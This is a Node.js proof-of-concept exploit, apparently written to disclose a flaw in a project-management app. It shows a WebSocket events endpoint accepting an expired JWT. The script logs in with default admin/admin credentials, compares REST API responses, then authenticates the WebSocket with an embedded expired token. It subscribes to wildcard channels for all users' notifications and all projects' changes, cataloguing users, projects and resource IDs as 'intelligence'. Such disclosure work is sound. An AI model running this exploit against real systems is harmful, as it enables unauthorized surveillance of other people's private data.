const WebSocket = require('ws');
const { exec } = require('child_process');

// --- Configuration ---
const WS_URL = "ws://localhost:9000/events";
const EXPIRED_TOKEN = "Your.Token.Here"; // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzU4NzI2MTY5LCJqdGkiOiI0YjgxNWQwMDIwOTc0NmQyYTNiNjlhNWQzNTJmZDZkNSIsInVzZXJfaWQiOjV9.W3AkyvgNQjYvD5ROa4nq7dfQL_8dS_-SdMc6rM2NvGU

console.log("WebSocket Sniffer");
console.log("===================================================");

// Token validation function
function validateToken(token, label) {
    console.log(`\n${label} TOKEN VALIDATION`);
    console.log("========================");
    console.log(`Token: ${token.substring(0, 50)}...`);
    
    try {
        const parts = token.split('.');
        const payload = parts[1];
        const paddedPayload = payload + '='.repeat((4 - payload.length % 4) % 4);
        const decodedPayload = Buffer.from(paddedPayload, 'base64').toString('utf8');
        const decoded = JSON.parse(decodedPayload);
        
        console.log("Token Payload:");
        console.log(JSON.stringify(decoded, null, 2));
        
        const now = Math.floor(Date.now() / 1000);
        const exp = decoded.exp;
        const expDate = new Date(exp * 1000);
        
        console.log("\nTime Analysis:");
        console.log(`   Current time: ${new Date().toISOString()}`);
        console.log(`   Token expires: ${expDate.toISOString()}`);
        console.log(`   Current Unix: ${now}`);
        console.log(`   Expires Unix: ${exp}`);
        console.log(`   Time difference: ${now - exp} seconds`);
        
        if (now > exp) {
            console.log("TOKEN IS EXPIRED!");
            console.log(`   Expired ${Math.floor((now - exp) / 60)} minutes ago`);
            console.log(`   Expired ${Math.floor((now - exp) / 3600)} hours ago`);
            return { valid: false, expired: true, decoded };
        } else {
            console.log("TOKEN IS STILL VALID");
            console.log(`   Valid for ${Math.floor((exp - now) / 60)} more minutes`);
            return { valid: true, expired: false, decoded };
        }
        
    } catch (error) {
        console.error("Error decoding token:", error.message);
        return { valid: false, expired: false, error: error.message };
    }
}

// Get valid token function
function getValidToken() {
    return new Promise((resolve, reject) => {
        console.log("\nSTEP 1: GETTING VALID TOKEN");
        console.log("============================");
        
        exec('curl -s -X POST http://localhost:9000/api/v1/auth -H "Content-Type: application/json" -d \'{"type": "normal", "username": "admin", "password": "admin"}\'', (error, stdout, stderr) => {
            if (error) {
                console.error("Failed to get valid token:", error.message);
                reject(error);
                return;
            }
            
            try {
                const response = JSON.parse(stdout);
                const token = response.auth_token;
                
                if (!token) {
                    console.error("No token in response:", stdout);
                    reject(new Error("No token received"));
                    return;
                }
                
                console.log("Valid token obtained successfully");
                console.log(`Token: ${token.substring(0, 50)}...`);
                
                // Validate the token
                const validation = validateToken(token, "VALID");
                resolve({ token, validation });
                
            } catch (e) {
                console.error("Failed to parse token response:", e.message);
                reject(e);
            }
        });
    });
}

// Test API with token
function testApiWithToken(token, label) {
    return new Promise((resolve) => {
        console.log(`\nTESTING API WITH ${label} TOKEN`);
        console.log("===============================");
        
        exec(`curl -s -X GET http://localhost:9000/api/v1/users/me -H "Authorization: Bearer ${token}"`, (error, stdout, stderr) => {
            if (error) {
                console.log(`API call failed: ${error.message}`);
                resolve({ success: false, error: error.message });
                return;
            }
            
            if (stdout.includes('username') || stdout.includes('admin')) {
                console.log("API accepts token: SUCCESS");
                console.log("Response:", stdout.substring(0, 200) + "...");
                resolve({ success: true, response: stdout });
            } else {
                console.log("API rejects token: FAILED");
                console.log("Response:", stdout);
                resolve({ success: false, response: stdout });
            }
        });
    });
}

// Main execution flow
async function main() {
    try {
        // Get and validate valid token
        const validTokenData = await getValidToken();
        
        // Test API with valid token
        const validApiResult = await testApiWithToken(validTokenData.token, "VALID");
        
        // Validate expired token
        const expiredValidation = validateToken(EXPIRED_TOKEN, "EXPIRED");
        
        // Test API with expired token
        const expiredApiResult = await testApiWithToken(EXPIRED_TOKEN, "EXPIRED");
        
        // Show comparison
        console.log("\nTOKEN COMPARISON SUMMARY");
        console.log("========================");
        console.log(`Valid Token: ${validTokenData.validation.valid ? 'VALID' : 'INVALID'}`);
        console.log(`Expired Token: ${expiredValidation.valid ? 'VALID' : 'INVALID'} (${expiredValidation.expired ? 'EXPIRED' : 'NOT EXPIRED'})`);
        console.log(`API with Valid Token: ${validApiResult.success ? 'ACCEPTED' : 'REJECTED'}`);
        console.log(`API with Expired Token: ${expiredApiResult.success ? 'ACCEPTED' : 'REJECTED'}`);
        
        //  Demonstrate WebSocket vulnerability
        console.log("\nWEBSOCKET VULNERABILITY");
        console.log("=====================================");
        console.log("Now testing WebSocket with EXPIRED token...");
        
        // Start WebSocket connection
        startWebSocketSurveillance();
        
    } catch (error) {
        console.error("Error in main execution:", error.message);
        process.exit(1);
    }
}

// WebSocket surveillance function
function startWebSocketSurveillance() {
    const ws = new WebSocket(WS_URL);
    let messageCount = 0;
    let projectActivity = {};
    let resourceIds = {};
    let userActivity = {};
    let allProjects = new Set();
    let allUsers = new Set();
    let activityTypes = {};
    let timeline = [];

    ws.onopen = () => {
        // Authenticate with expired token
        ws.send(JSON.stringify({
            cmd: "auth",
            data: { token: EXPIRED_TOKEN, sessionId: `attacker-session-${Date.now()}` }
        }));

        console.log("\nAuthenticated with EXPIRED token!");
        
    // Subscribe to ALL projects and activities for comprehensive intelligence gathering
    console.log("\nSubscribing to ALL live data...");
    const subscriptions = [
        // Global notifications for all users
        "live_notifications.*",     // ALL user notifications
        "web_notifications.*",      // ALL web notifications
        
        // Global project changes (all projects)
        "changes.project.*.projects",     // ALL project changes
        "changes.project.*.userstories",  // ALL user story changes  
        "changes.project.*.tasks",        // ALL task changes
        "changes.project.*.issues",       // ALL issue changes
        "changes.project.*.milestones",   // ALL milestone changes
        "changes.project.*.wiki_pages",   // ALL wiki page changes
        "changes.project.*.epics"        // ALL epic changes
    ];
        
        subscriptions.forEach(routingKey => {
            ws.send(JSON.stringify({
                cmd: "subscribe",
                routing_key: routingKey
            }));
        });
        
        console.log("\nWaiting for activity...");
    };

    ws.onmessage = (event) => {
        messageCount++;
        const message = JSON.parse(event.data);
        
        console.log(`\n[${messageCount}] INTERCEPTED MESSAGE:`);
        console.log("=====================================");
        
        // Analyze the intelligence value
        if (message.routing_key && message.data) {
            const routingParts = message.routing_key.split('.');
            const routingType = routingParts[0];
            const projectId = routingParts[2];
            const itemType = routingParts[3];
            const action = message.data.type;
            const resourceId = message.data.pk;
            const timestamp = new Date().toISOString();
            
            // Track all projects
            if (projectId && projectId !== '*') {
                allProjects.add(projectId);
            }
            
            // Track activity types
            if (!activityTypes[action]) {
                activityTypes[action] = 0;
            }
            activityTypes[action]++;
            
            // Track timeline
            timeline.push({
                timestamp,
                routing_key: message.routing_key,
                action,
                projectId,
                itemType,
                resourceId
            });
            
            // Track project activity
            if (projectId && projectId !== '*') {
                if (!projectActivity[projectId]) {
                    projectActivity[projectId] = { creates: 0, changes: 0, items: {} };
                }
                if (!projectActivity[projectId].items[itemType]) {
                    projectActivity[projectId].items[itemType] = 0;
                }
                
                if (action === 'create') {
                    projectActivity[projectId].creates++;
                } else if (action === 'change') {
                    projectActivity[projectId].changes++;
                }
                projectActivity[projectId].items[itemType]++;
            }
            
            // Track resource IDs
            if (resourceId) {
                if (!resourceIds[itemType]) {
                    resourceIds[itemType] = [];
                }
                if (!resourceIds[itemType].includes(resourceId)) {
                    resourceIds[itemType].push(resourceId);
                }
            }
            
            // Track user activity (if we can extract user info)
            if (message.routing_key.includes('notifications.')) {
                const userId = message.routing_key.split('.')[1];
                if (userId && userId !== '*') {
                    allUsers.add(userId);
                    if (!userActivity[userId]) {
                        userActivity[userId] = 0;
                    }
                    userActivity[userId]++;
                }
            }
            
            console.log(`ANALYSIS:`);
            console.log(`   Routing Type: ${routingType}`);
            console.log(`   Project ID: ${projectId || 'GLOBAL'}`);
            console.log(`   Item Type: ${itemType || 'NOTIFICATION'}`);
            console.log(`   Action: ${action}`);
            console.log(`   Resource ID: ${resourceId || 'N/A'}`);
            console.log(`   Timestamp: ${timestamp}`);
            
            console.log(`\nRAW MESSAGE:`);
            console.log(JSON.stringify(message, null, 2));
            
            // Show comprehensive intelligence summary
            console.log(`\nSUMMARY:`);
            console.log(`   Total Messages Intercepted: ${messageCount}`);
            console.log(`   Projects Discovered: ${allProjects.size} (${Array.from(allProjects).join(', ')})`);
            console.log(`   Users Discovered: ${allUsers.size} (${Array.from(allUsers).join(', ')})`);
            console.log(`   Activity Types: ${JSON.stringify(activityTypes, null, 2)}`);
            
            if (Object.keys(projectActivity).length > 0) {
                console.log(`\nPROJECT ACTIVITY BREAKDOWN:`);
                Object.keys(projectActivity).forEach(pid => {
                    const activity = projectActivity[pid];
                    console.log(`   Project ${pid}: ${activity.creates} creates, ${activity.changes} changes`);
                    Object.keys(activity.items).forEach(item => {
                        console.log(`     -> ${item}: ${activity.items[item]} events`);
                    });
                });
            }
            
            if (Object.keys(userActivity).length > 0) {
                console.log(`\nUSER ACTIVITY BREAKDOWN:`);
                Object.keys(userActivity).forEach(uid => {
                    console.log(`   User ${uid}: ${userActivity[uid]} notifications`);
                });
            }
            
            if (Object.keys(resourceIds).length > 0) {
                console.log(`\nDISCOVERED RESOURCE IDs:`);
                Object.keys(resourceIds).forEach(type => {
                    console.log(`   ${type}: [${resourceIds[type].join(', ')}]`);
                });
            }
            
            // Show recent activity timeline
            if (timeline.length > 0) {
                console.log(`\nRECENT ACTIVITY TIMELINE (Last 5 events):`);
                timeline.slice(-5).forEach((event, idx) => {
                    console.log(`   ${idx + 1}. ${event.timestamp} - ${event.action} ${event.itemType} in project ${event.projectId || 'GLOBAL'}`);
                });
            }
        }
    };

    ws.onclose = (event) => {
        console.log(`\nSurveillance ended (code: ${event.code})`);
        console.log("\nCOMPREHENSIVE SECURITY IMPACT SUMMARY:");
        console.log("======================================");
        console.log(`Successfully bypassed JWT expiration validation`);
        console.log(`Intercepted ${messageCount} real-time messages`);
        console.log(`Monitored ${allProjects.size} projects system-wide`);
        console.log(`Discovered ${allUsers.size} active users`);
        console.log(`Tracked ${Object.keys(activityTypes).length} different activity types`);
        console.log(`Gathered comprehensive business intelligence`);
        console.log(`Discovered ${Object.keys(resourceIds).reduce((sum, type) => sum + resourceIds[type].length, 0)} resource IDs`);
        
        console.log("\nDETAILED INTELLIGENCE GATHERED:");
        console.log("===============================");
        console.log(`Projects Discovered: ${Array.from(allProjects).join(', ')}`);
        console.log(`Users Discovered: ${Array.from(allUsers).join(', ')}`);
        console.log(`Activity Types: ${JSON.stringify(activityTypes, null, 2)}`);
        
        if (Object.keys(projectActivity).length > 0) {
            console.log("\nProject Activity Summary:");
            Object.keys(projectActivity).forEach(pid => {
                const activity = projectActivity[pid];
                console.log(`   Project ${pid}: ${activity.creates} creates, ${activity.changes} changes`);
            });
        }
        
        if (Object.keys(userActivity).length > 0) {
            console.log("\nUser Activity Summary:");
            Object.keys(userActivity).forEach(uid => {
                console.log(`   User ${uid}: ${userActivity[uid]} notifications`);
            });
        }
    };

    ws.onerror = (error) => {
        console.error("Surveillance error:", error.message);
    };
}

// Keep running
process.on('SIGINT', () => {
    console.log("\nEnding surveillance...");
    process.exit(0);
});

// Start the demonstration
main();
